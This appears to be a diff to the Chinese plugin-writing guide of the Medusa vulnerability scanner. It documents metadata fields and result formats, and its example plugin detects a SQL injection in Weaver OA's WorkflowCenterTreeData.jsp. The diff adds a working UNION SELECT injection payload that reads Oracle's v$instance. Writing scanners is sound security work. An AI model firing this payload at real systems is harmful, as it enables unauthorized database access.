@@ -12,15 +12,21 @@ __author__ = 'Ascotbe'
 __times__ = '2019/10/13 22:12 PM'
 import urllib
 import requests
+import logging
+import ClassCongregation
 import re
 class VulnerabilityInfo(object):
-    def __init__(self):
+    def __init__(self,Medusa):
         self.info = {}
         self.info['author'] = "Ascotbe"  # 插件作者
-        self.info['CreateDate'] = "2019-10-13"  # 插件编辑时间
-        self.info['algroup'] = "Weaver_WorkflowCenterTreeDataInterfaceInjectionVulnerability"  # 漏洞名称
+        self.info['createDate'] = "2019-10-13"  # 插件编辑时间
+        self.info['algroup'] = "Weaver_WorkflowCenterTreeDataInterfaceInjectionVulnerability"  # 插件名称
+        self.info['name'] ='泛微OA_WorkflowCenterTreeData接口注入漏洞' #漏洞名称
         self.info['affects'] = "泛微OA"  # 漏洞组件
         self.info['desc_content'] = "泛微OA_WorkflowCenterTreeData接口注入漏洞"  # 漏洞描述
+        self.info['rank'] = "高危"  # 漏洞等级
+        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
+        self.info['details'] = Medusa  # 结果
 
 def UrlProcessing(url):
     if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
@@ -71,11 +77,14 @@ def medusa(Url,RandomAgent,ProxyIp):
         if code == 200 and con.lower().find('''"draggable":''') != -1 and con.lower().find(
                 '''"checked":''') != -1 and con.lower().find('''"id":''') != -1 and con.lower().find(
                 '''"text":''') != -1:
-            Medusa = "{} 存在泛微OA WorkflowCenterTreeData接口注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
-            return (Medusa)
+            Medusa = "{} 验证数据:\r\nRequests:{}\r\n".format(url,resp.headers)
+            _t=VulnerabilityInfo(Medusa)
+            web=ClassCongregation.VulnerabilityDetails()
+            web.High(_t.info) # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
+            return (_t.info)
     except Exception:
         logging.warning(Url)#漏洞的请求url
-        _ = VulnerabilityInfo()
+        _ = VulnerabilityInfo('')
         logging.warning(_.info.get('parameter'))#捕获的插件名称
         
 ```
@@ -86,21 +95,29 @@ def medusa(Url,RandomAgent,ProxyIp):
 class VulnerabilityInfo(object):
     def __init__(self):
         self.info = {}
-        self.info['Author'] = "Ascotbe"  # 插件作者
-        self.info['CreateDate'] = "2019-10-13"  # 插件编辑时间
-        self.info['VName'] = "XXXXXXXXXXXXXXXXXXXX"  # 漏洞名称
-        self.info['Affects'] = "该漏洞存在哪个组件中的哪个版本"  # 漏洞组件
-        self.info['DescContent'] = "漏洞详情，比如在哪个位置，有什么危害，什么地方没写好或者没过滤导致的等"  # 漏洞描述
+        self.info['author'] = "Ascotbe"  # 插件作者
+        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
+        self.info['algroup'] = "XXXXXXXXXXXXXXXXXXXX"  # 插件名称
+        self.info['name'] ='泛微OA_WorkflowCenterTreeData接口注入漏洞' #漏洞名称
+        self.info['affects'] = "该漏洞是哪个组件的，比如这个插件就是叫：泛微OA"  # 漏洞组件
+        self.info['desc_content'] = "漏洞描述，比如在组件的哪个版本，哪个位置，有什么危害，什么地方没写好或者没过滤导致的等"  # 漏洞描述
+        self.info['rank'] = "这边写危害等级，比如这个插件就该写:高危"  # 漏洞等级
+        self.info['suggest'] = "给出缓解措施，或者解决办法"  # 修复建议
+        self.info['details'] = Medusa  # 结果需要传入的恒定不变
 
 ```
 
-| 函数名      | 值           | 备注                                                         |
-| :---------- | ------------ | ------------------------------------------------------------ |
-| Author      | 插件作者     |                                                              |
-| CreateDate  | 插件编辑时间 | 格式为：年-月-日                                             |
-| VName       | 漏洞名称     | 要和文件名相同，并且只能英文（所有.都要替换为_               |
-| Affects     | 漏洞组件     | 该漏洞存在哪个组件中的哪个版本                               |
-| DescContent | 漏洞描述     | 漏洞详情，比如在哪个位置，有什么危害，什么地方没写好或者没过滤导致的等 |
+| 函数名       | 值           | 备注                                                         |
+| :----------- | ------------ | ------------------------------------------------------------ |
+| author       | 插件作者     |                                                              |
+| create_date  | 插件编辑时间 | 格式为：年-月-日                                             |
+| algroup      | 插件名称     | 要和文件名相同，并且只能英文（所有.都要替换为_               |
+| name         | 漏洞名称     | 插件的中文名，要与插件名翻译结果相同                         |
+| affects      | 漏洞组件     | 该漏洞存在哪个组件中的哪个版本                               |
+| desc_content | 漏洞描述     | 漏洞描述，比如在组件的哪个版本，哪个位置，有什么危害，什么地方没写好或者没过滤导致的等 |
+| rank         | 漏洞等级     | 分为：严重、高危、中危、低危四个种类                         |
+| suggest      | 修复建议     | 给出缓解措施，或者解决办法                                   |
+| details      | 结果         | 该值为如果扫描结束后确认了漏洞而传入的参数，恒定为Medusa     |
 
 ### UrlProcessing函数
 
@@ -132,9 +149,10 @@ def medusa(Url,RandomAgent,ProxyIp):
     global resp
     global resp2
     try:
-        payload = ""
-        payload_post=''
+        payload = "/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333"
         payload_url = scheme + "://" + url + payload
+
+
         headers = {
             'User-Agent': RandomAgent,
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -144,19 +162,31 @@ def medusa(Url,RandomAgent,ProxyIp):
         s = requests.session()
         if ProxyIp!=None:
             proxies = {
+                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                 "http": "http://" + str(ProxyIp)
             }
-            resp = s.post(payload_url,data=payload_post,headers=headers, timeout=6, proxies=proxies,verify=False)
+            resp = s.post(payload_url,
+                          data={'formids': '11111111111)))' + '\x0a\x0d' * 360 + 'union select NULL,instance_name from '
+                                                                                 'v$instance order by (((1'},
+                          headers=headers, timeout=6, proxies=proxies,verify=False)
         elif ProxyIp==None:
-            resp = s.post(payload_url,data=payload_post,headers=headers, timeout=6, verify=False)
+            resp = s.post(payload_url,
+                         data={'formids': '11111111111)))' + '\x0a\x0d' * 360 + 'union select NULL,instance_name from '
+                                                                                'v$instance order by (((1'},
+                         headers=headers, timeout=6, verify=False)
         con = resp.text
         code = resp.status_code
-        if code == 200 and con.lower().find('''唯一存在的字符串''') != -1 :
-            Medusa = "{} 存在XXXXX漏洞\r\n漏洞详情:\r\nPayload:{}\r\nPost:{}\r\n".format(url, payload_url,payload_post)
-            return (Medusa)
+        if code == 200 and con.lower().find('''"draggable":''') != -1 and con.lower().find(
+                '''"checked":''') != -1 and con.lower().find('''"id":''') != -1 and con.lower().find(
+                '''"text":''') != -1:
+            Medusa = "{} 验证数据:\r\nRequests:{}\r\n".format(url,resp.headers)
+            _t=VulnerabilityInfo(Medusa)
+            web=ClassCongregation.VulnerabilityDetails()
+            web.High(_t.info) # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
+            return (_t.info)
     except Exception:
         logging.warning(Url)#漏洞的请求url
-        _ = VulnerabilityInfo()
+        _ = VulnerabilityInfo('')
         logging.warning(_.info.get('parameter'))#捕获的插件名称
 ```
 
@@ -187,7 +217,34 @@ def medusa(Url,RandomAgent,ProxyIp):
 
 ###### Medusa
 
-- 该值为漏洞扫描结束的值，需要返回给调用函数
+- 该值为漏洞扫描结束的值，需要传给类中，之后封装好调用类写入数据库中
+
+- 返回结果要可读并且要那种一眼就能看出来的,例如下面给出的数据库弱口令为例，必须可读容易验证
+
+  ```
+  www.ascotbe.com 验证数据:
+  url:www.ascotbe.com:3306
+  username:root
+  password:root
+  ```
+
+- 如果数据是Get请求或者是Post请求并存在数据包，应该返回如下信息，验证漏洞直接使用数据包即可(利用Post请求举例，Get同理)
+
+  ```http
+  POST / HTTP/1.1
+  Host: www.ascotbe.com
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
+  Accept: */*
+  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+  Accept-Encoding: gzip, deflate
+  Content-Type: application/ocsp-request
+  Content-Length: 83
+  Connection: close
+  
+  id=1&name=xxx
+  ```
+
+- 移除类的返回值可以为空因为数据过于庞大，也不宜验证
 
 ###### ProxyIp
 
@@ -211,15 +268,18 @@ if ProxyIp!=None:
         if code == 200 and con.lower().find('''"draggable":''') != -1 and con.lower().find(
                 '''"checked":''') != -1 and con.lower().find('''"id":''') != -1 and con.lower().find(
                 '''"text":''') != -1:
-            Medusa = "{} 存在泛微OA WorkflowCenterTreeData接口注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
-            return (Medusa)
+            Medusa = "{} 验证数据:\r\nRequests:{}\r\n".format(url,resp.headers)
+            _t=VulnerabilityInfo(Medusa)
+            web=ClassCongregation.VulnerabilityDetails()
+            web.High(_t.info) # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
+            return (_t.info)
 ```
 
 ###### 多个payload
 
 - 当一个漏洞脚本存在多个```payload```的时候使用循环来验证漏洞，但是这个漏洞第一次验证存在后续还能验证出漏洞的时候，需要在前面声明```Medusas=[]```来存放
 
-- ```if```判断不使用```return(Medusa)```语句，而是使用```Medusas.append(str(Medusa))```
+- ```if```判断不使用```return(_t.info)```语句，而是使用```Medusas.append(str(_t.info))```
 
 - 在后面增加循环
 
@@ -263,11 +323,14 @@ if ProxyIp!=None:
   			con = resp.text
   			code = resp.status_code
   			if code == 200:
-  				Medusa = "{} 存在XXXX漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
-  				Medusas.append(str(Medusa))
+  				Medusa = "{} 验证数据:\r\nRequests:{}\r\n".format(url,resp.headers)
+              	_t=VulnerabilityInfo(Medusa)
+              	web=ClassCongregation.VulnerabilityDetails()
+              	web.High(_t.info) # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
+                  Medusas.append(str(_t.info))
   		except Exception as e:
               logging.warning(Url)#漏洞的请求url
-              _ = VulnerabilityInfo()
+              _ = VulnerabilityInfo('')
               logging.warning(_.info.get('parameter'))#捕获的插件名称
       try:
   		for i in Medusas:
